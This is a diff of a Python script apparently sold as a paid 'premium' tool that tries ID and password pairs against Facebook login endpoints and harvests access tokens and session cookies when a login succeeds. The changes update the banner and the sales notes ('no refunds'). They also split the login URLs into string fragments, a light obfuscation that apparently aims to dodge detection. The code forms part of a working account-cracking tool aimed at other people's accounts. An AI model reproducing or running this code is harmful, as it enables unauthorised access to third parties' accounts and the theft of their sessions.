@@ -349,6 +349,20 @@ BA = '\x1b[1;100m'
 my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
+orange = "\x1b[38;5;196m"
+yellow = "\x1b[38;5;208m"
+black="\033[1;30m"
+rad="\x1b[38;5;160m"
+green="\x1b[38;5;46m"
+yelloww="\033[1;33m"
+blue="\033[38;5;6m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+white="\033[1;37m"
+faltu = "\033[1;47m"
+pvt = "\033[1;0m"
+gren = "\x1b[38;5;154m"
+gas = "\033[1;32m"
 ###----------[ CONVERT LINE ]----------###
 led = f'{M} -{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}{M}-{M}-{M}-{H}-{M}'
 ###----------[ BANNER MENUH ]----------###
@@ -394,11 +408,11 @@ def banner():
    ███████║   ██║   ██║   ██║██╔████╔██║
    ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
    ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
-   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \x1b[38;1;97m ᴾᴿᴼ"""); print("""\033[38;5;196m────────────────────────────────────────────
-\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m CEO & OWNER    \033[38;5;196m : \x1b[38;5;196m SUMON X 𝗖𝗛𝗢𝗬𝗢𝗡
-\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m  ABOUTS  \033[38;5;196m  :\x1b[38;5;196m DESTROYED
-\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m  :\x1b[38;1;97m 109.0.5.0.3
-\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m   :\x1b[38;5;196m PREMIUM 
+   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \x1b[38;1;97m ᴾᴿᴼ""");print("""\033[38;5;196m────────────────────────────────────────────
+\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m CEO & OWNER \033[38;5;196m :\x1b[38;5;196m SUMON ROY
+\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m ABOUTS  \033[38;5;196m     :\x1b[38;5;196m DESTROYED
+\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m     :\x1b[38;1;97m  109.0.5.0.3
+\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m      :\x1b[38;5;196m PREMIUM 
 \033[38;5;196m────────────────────────────────────────────""")
 ip = requests.get("https://api.ipify.org").text
 
@@ -444,12 +458,12 @@ class Process:
             self.clear()
             print("\x1b[38;1;97m               NOTES   ")
             print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
-            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m ATOM TOOLS DAILY UPDATE ")
-            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m If the Facebook server is down then the tools will not be working ")
+            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Buy on your own and no refunds after purchase ")
             print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +self.key)
             input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
             time.sleep(3.5)
-            tks = 'TOKEN KEY =%20%20:%20'+self.key
+            tks = 'SECURITY KEY =%20%20:%20'+self.key
             os.system('am start https://wa.me/+918389066877?text=' + tks)
             exit()
     def clear(self):os.system('clear');banner()
@@ -1291,7 +1305,7 @@ def m5(idf,pwv):
             'X-FB-Client-IP':'True',
             'X-FB-Server-Cluster':'True',
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'https://b-graph.facebook.com/auth/login'
+            url = 'htt'+'ps://g'+'raph.face'+'book.com/auth/login'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
@@ -1369,7 +1383,7 @@ def m6(idf,pwv):
             'X-FB-Client-IP':'True',
             'X-FB-Server-Cluster':'True',
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'https://b-graph.facebook.com/auth/login'
+            url = 'htt'+'ps://b-gr'+'aph.face'+'book.com/auth/login'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
@@ -1456,7 +1470,7 @@ def m7(idf,pwv):
             "X-FB-Client-IP": "True",
             "X-FB-Server-Cluster": "True",
             'X-FB-HTTP-Engine': 'Liger'}
-            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
+            url = 'htt'+'ps://api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
